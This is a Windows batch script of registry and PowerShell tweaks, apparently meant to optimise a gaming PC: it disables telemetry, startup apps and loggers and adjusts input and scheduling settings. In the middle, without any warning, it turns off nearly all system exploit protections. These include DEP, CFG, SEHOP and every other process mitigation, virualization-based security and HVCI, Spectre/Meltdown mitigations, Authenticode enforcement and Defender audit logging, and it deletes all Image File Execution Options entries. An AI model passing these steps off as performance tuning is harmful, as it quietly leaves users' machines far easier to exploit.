Reg add "HKLM\SOFTWARE\Microsoft\Direct3D" /v "UseMMXForRGB" /t Reg_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Direct3D" /v "UseMMXForRGB" /t Reg_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Microsoft\Direct3D\Drivers" /v "UseMMXForRGB" /t Reg_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Direct3D\Drivers" /v "UseMMXForRGB" /t Reg_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Microsoft\Direct3D\Drivers" /v "EnumSeparateMMX" /t Reg_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Direct3D\Drivers" /v "EnumSeparateMMX" /t Reg_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Microsoft\DirectDraw" /v "ForceNoSysLock" /t Reg_DWORD /d "0" /f
Reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\DirectDraw" /v "ForceNoSysLock" /t Reg_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\FTH" /v "Enabled" /t REG_DWORD /d "0" /f
Reg.exe delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\MicrosoftEdgeUpdateTaskMachineCore" /f
Reg.exe delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\MicrosoftEdgeUpdateTaskMachineUA" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Google\Chrome" /v "StartupBoostEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Google\Chrome" /v "BackgroundModeEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\DWM" /v "UseDpiScaling" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Multimedia\Audio" /v "UserDuckingPreference" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\Software\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\BootAnimation" /v "DisableStartupSound" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseSpeed" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseThreshold1" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseThreshold2" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "ctfmon" /t REG_SZ /d "C:\Windows\System32\ctfmon.exe" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\VideoSettings" /v "VideoQualityOnBattery" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "IconsOnly" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ListviewShadow" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "AllowDeviceNameInTelemetry" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\safer\codeidentifiers" /v "authenticodeenabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\Windows Error Reporting" /v "DontSendAdditionalData" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Speech_OneCore\Settings\OnlineSpeechPrivacy" /v "HasAccepted" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Personalization\Settings" /v "AcceptedPrivacyPolicy" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\InputPersonalization" /v "RestrictImplicitInkCollection" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\InputPersonalization" /v "RestrictImplicitTextCollection" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\InputPersonalization\TrainedDataStore" /v "HarvestContacts" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location" /v "Value" /t REG_SZ /d "Deny" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\appDiagnostics" /v "Value" /t REG_SZ /d "Deny" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userAccountInformation" /v "Value" /t REG_SZ /d "Deny" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SilentInstalledAppsEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SystemPaneSuggestionsEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SoftLandingEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "RotatingLockScreenEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "PublishUserActivities" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "UploadUserActivities" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications" /v "GlobalUserDisabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v "BackgroundAppGlobalToggle" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\Microsoft\Windows\CurrentVersion\DeliveryOptimization\Config" /v "DownloadMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "Discord" /t REG_BINARY /d "0300000066AF9C7C5A46D901" /f 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "Synapse3" /t REG_BINARY /d "030000007DC437B0EA9FD901" /f 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "Spotify" /t REG_BINARY /d "0300000070E93D7B5A46D901" /f 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "EpicGamesLauncher" /t REG_BINARY /d "03000000F51C70A77A48D901" /f 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "RiotClient" /t REG_BINARY /d "03000000A0EA598A88B2D901" /f 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "Steam" /t REG_BINARY /d "03000000E7766B83316FD901" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v "EnableTransparency" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ListviewAlphaSelect" /t REG_DWORD /d 0 /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "DisallowShaking" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\People" /v "PeopleBand" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\System" /v "EnableActivityFeed" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowTaskViewButton" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\NetworkProvider" /v "RestoreConnection" /t REG_DWORD /d 0 /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "HideSCAMeetNow" /t REG_dWORD /d 1 /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Feeds" /v "ShellFeedsTaskbarViewMode" /t REG_DWORD /d 2 /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\CloudContent" /v DisableSoftLanding /t REG_DWORD /d 1 /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v "LongPathsEnabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowSyncProviderNotifications" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v "AppsUseLightTheme" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v "AppsUseLightTheme" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\AppContainer\Storage\microsoft.microsoftedge_8wekyb3d8bbwe\MicrosoftEdge\Main" /v "Theme" /t REG_DWORD /d "1" /f
Reg.exe add "HKEY_USERS\.DEFAULT\Control Panel\Keyboard" /v InitialKeyboardIndicators /t REG_SZ /d "2147483650" /f
Reg.exe add "HKCU\Control Panel\Keyboard" /v "KeyboardSpeed" /t REG_SZ /d "31" /f
Reg.exe add "HKEY_USERS\.DEFAULT\Control Panel\Keyboard" /v "InitialKeyboardIndicators" /t REG_SZ /d "2" /f
Reg.exe add "HKCU\Control Panel\Keyboard" /v "InitialKeyboardIndicators" /t REG_SZ /d "2" /f
Reg.exe add "HKEY_USERS\.DEFAULT\Control Panel\Keyboard" /v "KeyboardDelay" /t REG_SZ /d "0" /f
Reg.exe add "HKEY_USERS\.DEFAULT\Control Panel\Keyboard" /v "KeyboardSpeed" /t REG_SZ /d "31" /f
cls
powershell set-ProcessMitigation -System -Disable  DEP, EmulateAtlThunks, SEHOP, ForceRelocateImages, RequireInfo, BottomUp, HighEntropy, StrictHandle, DisableWin32kSystemCalls, AuditSystemCall, DisableExtensionPoints, BlockDynamicCode, AllowThreadsToOptOut, AuditDynamicCode, CFG, SuppressExports, StrictCFG, MicrosoftSignedOnly, AllowStoreSignedBinaries, AuditMicrosoftSigned, AuditStoreSigned, EnforceModuleDependencySigning, DisableNonSystemFonts, AuditFont, BlockRemoteImageLoads, BlockLowLabelImageLoads, PreferSystem32, AuditRemoteImageLoads, AuditLowLabelImageLoads, AuditPreferSystem32, EnableExportAddressFilter, AuditEnableExportAddressFilter, EnableExportAddressFilterPlus, AuditEnableExportAddressFilterPlus, EnableImportAddressFilter, AuditEnableImportAddressFilter, EnableRopStackPivot, AuditEnableRopStackPivot, EnableRopCallerCheck, AuditEnableRopCallerCheck, EnableRopSimExec, AuditEnableRopSimExec, SEHOP, AuditSEHOP, SEHOPTelemetry, TerminateOnError, DisallowChildProcessCreation, AuditChildProcess
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" /v "Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csrss.exe" /v MitigationAuditOptions /t Reg_BINARY /d "222222222222222222222222222222222222222222222222" /f
Reg.exe add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csrss.exe" /v MitigationOptions /t Reg_BINARY /d "222222222222222222222222222222222222222222222222" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Session Manager\kernel" /v "DisableTsx" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\Software\Microsoft\PolicyManager\default\DmaGuard\DeviceEnumerationPolicy" /v "value" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\DeviceGuard" /v "HVCIMATRequired" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\DeviceGuard" /v "EnableVirtualizationBasedSecurity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DisableExceptionChainValidation" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "KernelSEHOPEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "MoveImages" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettings" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverride" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverrideMask" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "MoveImages" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\Memory Management" /v "FeatureSettings" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\Memory Management" /v "FeatureSettingsOverride" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\Memory Management" /v "FeatureSettingsOverrideMask" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\Memory Management" /v "EnableCfg" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\Memory Management" /v "MoveImages" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "EnableCfg" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Session Manager" /v "ProtectionMode" /t REG_DWORD /d "0" /f
sc config SysMain start= autoz
sc start SysMain
cls
powershell "ForEach($v in (Get-Command -Name \"Set-ProcessMitigation\").Parameters[\"Disable\"].Attributes.ValidValues){Set-ProcessMitigation -System -Disable $v.ToString() -ErrorAction SilentlyContinue}"
powershell "Remove-Item -Path \"HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\*\" -Recurse -ErrorAction SilentlyContinue"
cls
sc stop SysMain
sc config SysMain start= disabled
Reg.exe add "HKLM\System\CurrentControlSet\Control\Session Manager" /v "ProtectionMode" /t Reg_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "MitigationOptions" /t REG_BINARY /d "222222222222222222222222222222222222222222222222" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DisableExceptionChainValidation" /t Reg_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "MonitorLatencyTolerance" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "MonitorRefreshLatencyTolerance" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "MonitorLatencyTolerance" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "MonitorRefreshLatencyTolerance" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DpcWatchdogProfileOffset" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DisableExceptionChainValidation" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "KernelSEHOPEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DisableAutoBoost" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DpcTimeout" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "ThreadDpcEnable" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DpcWatchdogPeriod" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "InterruptSteeringDisabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DistributeTimers" /t REG_DWORD /d "1" /f
powercfg -setacvalueindex scheme_current SUB_DISK dbc9e238-6de9-49e3-92cd-8c2b4946b472 1
powercfg -setacvalueindex scheme_current SUB_DISK fc95af4d-40e7-4b6d-835a-56d131dbc80e 1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LowLatencyScalingPercentage" /t REG_DWORD /d "100" /f
Reg.exe add "HKCR\CLSID\{018D5C66-4533-4307-9B53-224DE2ED1FE6}\ShellFolder" /f /v "Attributes" /t REG_DWORD /d "0"
Reg.exe add "HKCR\Wow6432Node\CLSID\{018D5C66-4533-4307-9B53-224DE2ED1FE6}\ShellFolder" /f /v "Attributes" /t REG_DWORD /d "0"
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\OneDrive" /v "DisableFileSync" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\OneDrive" /v "DisableFileSyncNGSC" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\OneDrive" /v "DisableMeteredNetworkFileSync" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\OneDrive" /v "DisableLibrariesDefaultSaveToOneDrive" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\CPU\HardCap0" /v "CapPercentage" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\CPU\HardCap0" /v "SchedulingType" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\CPU\Paused" /v "CapPercentage" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\CPU\Paused" /v "SchedulingType" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\CPU\SoftCapFull" /v "CapPercentage" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\CPU\SoftCapFull" /v "SchedulingType" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\CPU\SoftCapLow" /v "CapPercentage" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\CPU\SoftCapLow" /v "SchedulingType" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Flags\BackgroundDefault" /v "IsLowPriority" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Flags\Frozen" /v "IsLowPriority" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Flags\FrozenDNCS" /v "IsLowPriority" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Flags\FrozenDNK" /v "IsLowPriority" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Flags\FrozenPPLE" /v "IsLowPriority" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Flags\Paused" /v "IsLowPriority" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Flags\PausedDNK" /v "IsLowPriority" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Flags\Pausing" /v "IsLowPriority" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Flags\PrelaunchForeground" /v "IsLowPriority" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Flags\ThrottleGPUInterference" /v "IsLowPriority" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\Critical" /v "BasePriority" /t REG_DWORD /d "82" /f
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\Critical" /v "OverTargetPriority" /t REG_DWORD /d "50" /f
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\CriticalNoUi" /v "BasePriority" /t REG_DWORD /d "82" /f
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\StartHost" /v "BasePriority" /t REG_DWORD /d "82" /f
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\StartHost" /v "OverTargetPriority" /t REG_DWORD /d "50" /f
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\VeryHigh" /v "BasePriority" /t REG_DWORD /d "82" /f
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\VeryHigh" /v "OverTargetPriority" /t REG_DWORD /d "50" /f
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\VeryLow" /v "BasePriority" /t REG_DWORD /d "82" /f
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\VeryLow" /v "OverTargetPriority" /t REG_DWORD /d "50" /f
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\IO\NoCap" /v "IOBandwidth" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Memory\NoCap" /v "CommitLimit" /t REG_DWORD /d "4294967295" /f
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Memory\NoCap" /v "CommitTarget" /t REG_DWORD /d "4294967295" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\PolicyManager\current\device\System" /v "AllowExperimentation" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\System\AllowExperimentation" /v "value" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\AppModel" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\Cellcore" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\Circular Kernel Context Logger" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\CloudExperienceHostOobe" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\DataMarket" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\DiagLog" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\HolographicDevice" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\iclsClient" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\iclsProxy" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\LwtNetLog" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\Mellanox-Kernel" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\Microsoft-Windows-AssignedAccess-Trace" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\Microsoft-Windows-Setup" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\NBSMBLOGGER" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\PEAuthLog" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\RdrLog" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\ReadyBoot" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SetupPlatform" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SetupPlatformTel" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SocketHeciServer" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SpoolerLogger" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SQMLogger" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\TCPIPLOGGER" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\TileStore" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\Tpm" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\TPMProvisioningService" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\UBPM" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\WdiContextLog" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\WFP-IPsec Trace" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\WiFiDriverIHVSession" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\WiFiDriverIHVSessionRepro" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\WiFiSession" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\WinPhoneCritical" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WUDF" /v "LogEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WUDF" /v "LogLevel" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "DisableThirdPartySuggestions" /t REG_DWORD /d "1" /f
